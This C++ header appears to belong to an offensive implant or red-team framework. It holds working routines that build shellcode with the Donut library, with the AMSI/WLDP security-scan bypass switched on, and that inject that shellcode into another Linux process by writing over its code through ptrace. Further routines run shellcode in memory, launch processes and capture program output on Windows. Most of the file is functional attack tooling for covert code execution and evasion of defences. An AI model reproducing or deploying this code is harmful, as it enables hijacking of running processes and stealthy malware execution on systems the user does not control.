#pragma once

#include <string>
#include <vector>

#ifdef __linux__
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <spawn.h>
#include <thread>
#include <future>
#define __cdecl __attribute__((__cdecl__))
#elif _WIN32
#include <windows.h>
#include <io.h>
#include <fcntl.h>
// #include <altstr.h>
#endif

#include <donut.h>

// create the shellcode from exe, unmanaged DLL/EXE or .NET DLL/EXE
// method, name of method or DLL function to invoke for .NET DLL and unmanaged DLL
// param, command line to use for unmanaged DLL/EXE and .NET DLL/EXE
std::string static inline creatShellCodeDonut(
	std::string cmd, std::string method, std::string param, std::string& shellcode, bool exitProcess=true, bool debug=false)
{
	std::string result;

	// Donut
	DONUT_CONFIG c;
	memset(&c, 0, sizeof(c));

	// copy input file
	memcpy(c.input, cmd.c_str(), DONUT_MAX_NAME - 1);

	// default settings
	c.inst_type = DONUT_INSTANCE_EMBED; // file is embedded
	c.arch = DONUT_ARCH_X84;			// dual-mode (x86+amd64)
	c.bypass = DONUT_BYPASS_CONTINUE;	// continues loading even if disabling AMSI/WLDP fails
	c.format = DONUT_FORMAT_BINARY;		// default output format
	c.compress = DONUT_COMPRESS_NONE;	// compression is disabled by default
	c.entropy = DONUT_ENTROPY_DEFAULT;	// enable random names + symmetric encryption by default
	if(exitProcess)
		c.exit_opt = DONUT_OPT_EXIT_PROCESS;// exit process
	else
		c.exit_opt = DONUT_OPT_EXIT_THREAD; // exit thread
	c.thread = 0;						// run entrypoint as a thread
	c.unicode = 0;						// command line will not be converted to unicode for unmanaged DLL function
	
	if(debug)
	{
		// debug settings
		c.bypass = DONUT_BYPASS_NONE;	// continues loading even if disabling AMSI/WLDP fails
		c.entropy = DONUT_ENTROPY_NONE;	// enable random names + symmetric encryption by default
	}

	if(method.size() <= (DONUT_MAX_NAME - 1) && param.size() <= (DONUT_MAX_NAME - 1)) 
	{	
		memcpy(c.param, param.c_str(), param.size());
		memcpy(c.method, method.c_str(), method.size());
	}
	
	// generate the shellcode
	int err = DonutCreate(&c);
	if (err != DONUT_ERROR_SUCCESS)
	{
		result += "Donut Error : ";
		result += DonutError(err);
		result += "\n";
		return result;
	}

	DonutDelete(&c);

	std::ifstream input(c.output, std::ios::binary);
	std::string buffer(std::istreambuf_iterator<char>(input), {});
	shellcode = buffer;

	DonutDelete(&c);

	result = "Donut Sucess.\n";

	return result;
}


#ifdef __linux__


int static inline inject_data (pid_t pid, const char *src, void *dst, int len)
{
  int  i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

	for(int i = 0; i < len; i+=4, s++, d++)
	{
		if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
		{
			return -1;
		}
	}

  return 0;
}

std::string static inline inject(int pid, const std::string& payload)
{
	std::string result;

	pid_t target = pid;
	
	struct user_regs_struct regs;
	int syscall;
	long dst;

	result+="Tracing process:";
	result+=std::to_string(pid);
	result+="\n";
  	if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
		result = "Error ptrace(ATTACH): ";
		result += strerror(errno);
		return result;
    }

	result+="Waiting for process\n";
	wait (NULL);

	result+="Getting Register\n";
	if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
		result = "Error ptrace(GETREGS): ";
		result += strerror(errno);
		return result;
    }
	
	result+="Injecting shell code\n";
	if(inject_data (target, payload.data(), (void*)regs.rip, payload.size())==-1)
	{
		result = "Error ptrace(POKETEXT): ";
		result += strerror(errno);
		return result;
	}

	regs.rip += 2;

	result+="Setting instruction pointer\n";
  	if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
		result = "Error ptrace(GETREGS): ";
		result += strerror(errno);
		return result;
    }

	result+="Run it!\n";
	if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
		result = "Error ptrace(DETACH): ";
		result += strerror(errno);
		return result;
	}

	result+="Injection success.\n";
    return result;
}

void static inline execShellCode(const std::string& payload)
{
    void *page = mmap(NULL, payload.size(), PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
    memcpy(page, payload.data(), payload.size());
    mprotect(page, payload.size(), PROT_READ|PROT_EXEC);
    ((void(*)())page)();

    return;
}

// std::string static inline selfInject(const std::string& payload)
// {
// 	std::string result;

//     std::thread t1(execShellCode, payload);
// 	t1.detach();

//     return result;
// }

int static inline launchProcess(const std::string& processToSpawn)
{
	std::string cmd = processToSpawn;
	std::string program = "sh";
	std::string programArg = "-c";
	std::string programPath = "/bin/sh";

	pid_t pid=-1;
	char *argv[] = {program.data(), programArg.data(), cmd.data(), NULL};
	int status = posix_spawn(&pid, programPath.data(), NULL, NULL, argv, environ);
	if (status == 0) 
	{
		pid_t endID=waitpid(pid, &status, WNOHANG);

		std::cout << "pid " << pid << std::endl;
		std::cout << "endID " << endID << std::endl;
	} 

	return pid;
}

std::string static inline spawnInject(const std::string& payload, const std::string& processToSpawn)
{
	std::string result = "TODO";

// 	std::string cmd = processToSpawn;
// 	std::string program = "sh";
// 	std::string programArg = "-c";
// 	std::string programPath = "/bin/sh";

// 	pid_t pid;
// 	char *argv[] = {program.data(), programArg.data(), cmd.data(), NULL};
// 	int status;
// 	fflush(NULL);
// 	status = posix_spawn(&pid, programPath.data(), NULL, NULL, argv, environ);
// 	if (status == 0) 
// 	{
// 		result =+ "Process injected.";
// 		fflush(NULL);

// 		inject(pid, payload);

// 		// if (waitpid(pid, &status, 0) != -1) 
// 		// {
// 		// } 
// 		// else 
// 		// {
// 		// 	perror("waitpid");
// 		// }
// 	} 
// 	else 
// 	{
// 		result =+ "Posix_spawn failed.";
// 	}
    return result;
}


#elif _WIN32


int static inline launchProcess(const std::string& processToSpawn)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	CreateProcess(processToSpawn.c_str(), NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

	return pi.dwProcessId;
}


class StdCapture
{
public:
    StdCapture(): m_capturing(false), m_init(false), m_oldStdOut(0), m_oldStdErr(0)
    {
        m_pipe[READ] = 0;
        m_pipe[WRITE] = 0;
        if (_pipe(m_pipe, 1048576, O_BINARY) == -1)
            return;
        m_oldStdOut = dup(fileno(stdout));
        m_oldStdErr = dup(fileno(stderr));
        if (m_oldStdOut == -1 || m_oldStdErr == -1)
            return;

        m_init = true;
    }

    ~StdCapture()
    {
        if (m_capturing)
        {
            EndCapture();
        }
        if (m_oldStdOut > 0)
            close(m_oldStdOut);
        if (m_oldStdErr > 0)
            close(m_oldStdErr);
        if (m_pipe[READ] > 0)
            close(m_pipe[READ]);
        if (m_pipe[WRITE] > 0)
            close(m_pipe[WRITE]);
    }


    void BeginCapture()
    {
        if (!m_init)
            return;
        if (m_capturing)
            EndCapture();
        fflush(stdout);
        fflush(stderr);
        dup2(m_pipe[WRITE], fileno(stdout));
        dup2(m_pipe[WRITE], fileno(stderr));
        m_capturing = true;
    }

    bool EndCapture()
    {
        if (!m_init)
            return false;
        if (!m_capturing)
            return false;
        fflush(stdout);
        fflush(stderr);
        dup2(m_oldStdOut, fileno(stdout));
        dup2(m_oldStdErr, fileno(stderr));
        m_captured.clear();

        std::string buf;
        const int bufSize = 1024;
        buf.resize(bufSize);
        int bytesRead = 0;
        if (!eof(m_pipe[READ]))
        {
            bytesRead = read(m_pipe[READ], &(*buf.begin()), bufSize);
        }
        while(bytesRead == bufSize)
        {
            m_captured += buf;
            bytesRead = 0;
            if (!eof(m_pipe[READ]))
            {
                bytesRead = read(m_pipe[READ], &(*buf.begin()), bufSize);
            }
        }
        if (bytesRead > 0)
        {
            buf.resize(bytesRead);
            m_captured += buf;
        }
        return true;
    }

    std::string GetCapture() const
    {
        std::string::size_type idx = m_captured.find_last_not_of("\r\n");
        if (idx == std::string::npos)
        {
            return m_captured;
        }
        else
        {
            return m_captured.substr(0, idx+1);
        }
    }

private:
    enum PIPES { READ, WRITE };
    int m_pipe[2];
    int m_oldStdOut;
    int m_oldStdErr;
    bool m_capturing;
    bool m_init;
    std::string m_captured;
};


#endif

